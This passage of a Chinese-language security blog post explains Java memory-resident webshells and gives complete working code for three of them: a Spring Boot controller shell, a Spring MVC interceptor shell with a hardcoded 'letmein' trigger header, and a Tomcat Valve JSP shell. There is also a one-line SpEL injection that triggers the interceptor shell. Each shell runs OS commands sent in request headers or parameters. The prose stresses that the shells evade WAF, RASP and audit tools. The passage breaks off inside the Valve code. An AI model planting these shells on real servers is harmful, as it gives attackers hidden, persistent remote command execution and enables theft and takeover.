.methods(org.springframework.web.bind.annotation.RequestMethod.GET)<br>                            .build();<br><br>            handlerMapping.registerMapping(mapping, evilController, method);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; Spring Controller 内存马注入成功！\n访问 /memshell，Header: X-Cmd=Base64(命令)&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; 注入失败: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Spring Boot 3.x</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectMemshellController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> ApplicationContext applicationContext;<br><br><br>    <span class="hljs-meta">@GetMapping(&quot;/makememshell&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">inject</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取 RequestMappingHandlerMapping</span><br>            org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">handlerMapping</span> <span class="hljs-operator">=</span><br>            applicationContext.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br><br>            <span class="hljs-comment">// 创建恶意 Controller（匿名对象）</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">evilController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>() &#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                    resp.setContentType(<span class="hljs-string">&quot;text/plain;charset=UTF-8&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;X-Cmd&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.isEmpty()) &#123;<br>                        out.println(<span class="hljs-string">&quot;Usage: curl -H &#x27;X-Cmd: aWQ=&#x27; http://target/memshell&quot;</span>);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">decoded</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(cmd));<br>                    Process p;<br>                    <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        p = Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c &quot;</span> + decoded);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        p = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, decoded&#125;);<br>                    &#125;<br>                    java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    s.close();<br>                    out.println(output);<br>                &#125;<br>            &#125;;<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> evilController.getClass().getDeclaredMethod(<span class="hljs-string">&quot;handle&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);<br>            org.springframework.web.servlet.mvc.method.<span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span><br>            org.springframework.web.servlet.mvc.method.RequestMappingInfo<br>            .paths(<span class="hljs-string">&quot;/memshell&quot;</span>)<br>            .methods(org.springframework.web.bind.annotation.RequestMethod.GET)<br>            .build();<br><br>            handlerMapping.registerMapping(mapping, evilController, method);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; Spring Controller 内存马注入成功！\n访问 /memshell，Header: X-Cmd=Base64(命令)&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; 注入失败: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1759050144089-ea38d701-6780-4186-b590-65398abd20c3.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="spring-intercetor-内存马"><a href="#spring-intercetor-内存马" class="headerlink" title="spring intercetor 内存马"></a>spring intercetor 内存马</h3><ul>
<li><strong>挂载点</strong>：Spring MVC Interceptor（通过 <code>RequestMappingHandlerMapping</code> 的 <code>adaptedInterceptors</code> 字段）。</li>
<li><strong>原理</strong>：对于 Spring MVC 应用，攻击者通过反射获取 Spring 上下文中的 <code>RequestMappingHandlerMapping</code> 实例，并修改其父类 <code>AbstractHandlerMapping</code> 中的 <code>adaptedInterceptors</code> 列表，动态插入一个恶意的 <code>HandlerInterceptor</code> 实现。该拦截器可在请求处理的 <code>preHandle</code> 阶段执行任意代码（如命令执行、回显 WebShell 等），且对所有经由 Spring MVC 路由的请求生效，无需新增 URL 路径。</li>
<li><strong>企业级危害</strong>：高度适配 Spring 应用架构，无需修改磁盘文件或注册新接口，隐蔽性强；恶意逻辑嵌入在正常请求流程中，可绕过基于 URL 白名单或接口审计的安全检测，实现持久化、低感知的远程控制，对传统 WAF 和代码审计工具具有极强的绕过能力。</li>
</ul>
<h4 id="HandlerInterceptor-接口的3个核心回调方法"><a href="#HandlerInterceptor-接口的3个核心回调方法" class="headerlink" title="HandlerInterceptor 接口的3个核心回调方法"></a><code>HandlerInterceptor</code> 接口的3个核心回调方法</h4><ul>
<li>preHandle( )：在 Controller 方法执行 之前 调用，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li>
<li>postHandle( )：在 Controller 方法执行 之后、视图渲染 之前 调用，可以通过此方法对请求域中的模型和视图做进一步的修改。此时业务逻辑已执行完毕，但响应尚未提交</li>
<li>afterCompletion( )：整个请求处理完成 之后（包括视图渲染），无论是否发生异常，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li>
</ul>
<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><p>在绝大多数 Interceptor 内存马实现中，会选择 <code>preHandle()</code> 作为挂载点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorMemShell</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1. 获取当前请求上下文，进而拿到 Spring ApplicationContext</span><br>        <span class="hljs-type">ServletRequestAttributes</span> <span class="hljs-variable">attrs</span> <span class="hljs-operator">=</span> (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> attrs.getRequest();<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) request.getServletContext()<br>                                         .getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet&quot;</span>);<br><br>        <span class="hljs-comment">// 2. 获取 RequestMappingHandlerMapping Bean（Spring Boot 默认 dispatcherServlet 名为 &quot;dispatcherServlet&quot;）</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">handlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><br>        <span class="hljs-comment">// 3. 构造恶意 Interceptor</span><br>        <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerInterceptor</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                <span class="hljs-comment">// 后门触发条件：请求中包含 password 参数（可自定义）</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;letmein&quot;</span>.equals(req.getHeader(<span class="hljs-string">&quot;X-Cmd-Secret&quot;</span>))) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span> &amp;&amp; !cmd.trim().isEmpty()) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(p.getInputStream())<br>                            );<br>                            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                            String line;<br>                            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>                            &#125;<br>                            resp.getWriter().println(output.toString());<br>                            resp.getWriter().flush();<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 阻断后续处理，避免日志或异常</span><br>                        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                            resp.getWriter().println(<span class="hljs-string">&quot;Error: &quot;</span> + e.toString());<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 正常流程</span><br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-comment">// 4. 反射注入到 adaptedInterceptors</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class<br>        .getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        List&lt;HandlerInterceptor&gt; interceptors = (List&lt;HandlerInterceptor&gt;) field.get(handlerMapping);<br><br>        <span class="hljs-comment">// 避免重复注入（可选）</span><br>        <span class="hljs-keyword">for</span> (HandlerInterceptor inter : interceptors) &#123;<br>            <span class="hljs-keyword">if</span> (inter.getClass().getName().contains(<span class="hljs-string">&quot;InterceptorMemShell&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 已存在，不再注入</span><br>            &#125;<br>        &#125;<br><br>        interceptors.add(evilInterceptor);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过controller触发</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        InterceptorMemShell.inject(); <span class="hljs-comment">// 执行注入</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;OK&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1759333826016-7660ce4d-11f0-4b37-8c96-e58e06818430.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>若应用中存在 <code>@Value(&quot;#&#123;userInput&#125;&quot;)</code> 或 Thymeleaf 表达式注入；</li>
<li>且 <code>InterceptorMemShell</code> 类已存在（或通过其他方式加载），则直接：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(com.example.demo.InterceptorMemShell).inject()<br></code></pre></td></tr></table></figure>

<h2 id="Tomcat-Valve-内存马"><a href="#Tomcat-Valve-内存马" class="headerlink" title="Tomcat Valve 内存马"></a>Tomcat Valve 内存马</h2><ul>
<li>挂载点：Tomcat Pipeline<code>Valve</code>。</li>
<li>原理：<code>Valve</code>是 Tomcat 请求处理管道中的核心组件，每个请求在到达目标 Servlet 之前都会经过一系列的<code>Valve</code>。攻击者通过反射将自定义的恶意<code>Valve</code>动态加入到 Tomcat 的<code>Pipeline</code>中，从而在所有请求处理的前后插入恶意逻辑。</li>
<li>企业级危害：影响范围广且隐蔽性强，能够全局拦截和处理 Tomcat 接收到的所有请求，比 Filter 更底层。可以实现通用性的数据窃取、流量劫持或命令执行。</li>
</ul>
<h3 id="什么是-Tomcat-Valve"><a href="#什么是-Tomcat-Valve" class="headerlink" title="什么是 Tomcat Valve"></a>什么是 Tomcat Valve</h3><p>Tomcat 使用 Pipeline-Valve 模式 处理请求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Connector → Engine → Host → Context → Wrapper (Servlet)<br>               ↑        ↑       ↑<br>            EngineValve → HostValve → ContextValve → ...<br></code></pre></td></tr></table></figure>

<p>每个容器（Engine/Host/Context）都有一个 Pipeline，里面是一系列 Valve（阀门），请求依次流经这些 Valve</p>
<p>Valve早于 Spring、Filter、Servlet 执行，因此能绕过大多数基于应用层的 RASP、WAF 和日志审计。</p>
<ul>
<li>可在 任意请求到达 Servlet 之前 插入逻辑</li>
<li>执行顺序：早于 Filter、早于 Spring DispatcherServlet</li>
<li>即使应用无任何接口，也能触发（只要 Tomcat 在运行）</li>
<li>可拦截所有请求（包括 404）</li>
</ul>
<h3 id="内存马-1"><a href="#内存马-1" class="headerlink" title="内存马"></a>内存马</h3><ol>
<li>动态创建一个继承 <code>ValveBase</code> 的恶意 Valve</li>
<li>获取 Tomcat 的 <code>StandardContext</code></li>
<li>调用 <code>context.getPipeline().addValve(evilValve)</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// Step 1: 获取 ServletContext（实际是 ApplicationContextFacade）</span><br>        javax.servlet.<span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br>        <span class="hljs-comment">// Step 2: 反射获取 ApplicationContextFacade 中的 &quot;context&quot; 字段（类型是 ApplicationContext）</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">facadeContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        facadeContextField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> facadeContextField.get(servletContext);<br><br>        <span class="hljs-comment">// Step 3: 从 ApplicationContext 中获取 StandardContext</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">standardContextObj</span> <span class="hljs-operator">=</span> standardContextField.get(applicationContext);<br><br>        <span class="hljs-keyword">if</span> (!(standardContextObj <span class="hljs-keyword">instanceof</span> StandardContext)) &#123;<br>            out.println(<span class="hljs-string">&quot;[-] Failed to get StandardContext, got: &quot;</span> + standardContextObj.getClass().getName());<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextObj;<br>        out.println(<span class="hljs-string">&quot;[+] Successfully got StandardContext: &quot;</span> + standardContext.getName());<br><br>        <span class="hljs-comment">// Step 4: 定义恶意 Valve</span><br>        <span class="hljs-type">ValveBase</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValveBase</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/tomcat-memshell&quot;</span>.equals(request.getRequestURI())) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">cmdHeader</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-Cmd&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (cmdHeader != <span class="hljs-literal">null</span> &amp;&amp; !cmdHeader.isEmpty()) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(cmdHeader));<br>                            Process p;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                                p = Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c &quot;</span> + cmd);<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                p = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;);<br>                            &#125;<br><br>                            <span class="hljs-comment">// Java 8 兼容读取输出</span><br>                            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br>                            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                            <span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                            <span class="hljs-type">int</span> nRead;<br>                            <span class="hljs-keyword">while</span> ((nRead = in.read(data, <span class="hljs-number">0</span>, data.length)) != -<span class="hljs-number">1</span>) &#123;<br>                                buffer.write(data, <span class="hljs-number">0</span>, nRead);<br>                            &#125;<br>                            <span class="hljs-type">byte</span>[] result = buffer.toByteArray();<br><br>                            response.setStatus(<span class="hljs-number">200</span>);<br>                            response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(result));<br>                            response.flushBuffer();<br>                            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 不继续调用下一个 Valve</span><br>                        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                            e.printStackTrace();<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// 正常请求：继续处理</span><br>                getNext().invoke(request, response);<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-comment">// Step 5: 注入 Valve</span><br>        standardContext.getPipeline().addValve(evilValve);<br>        out.println(<span class="hljs-string">&quot;[+] Tomcat Valve 内存马注入成功！&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;访问路径: /tomcat-memshell&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;Header: X-Cmd=Base64(命令)&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        out.println(<span class="hljs-string">&quot;[-] Error: &quot;</span> + e.getMessage());<br>    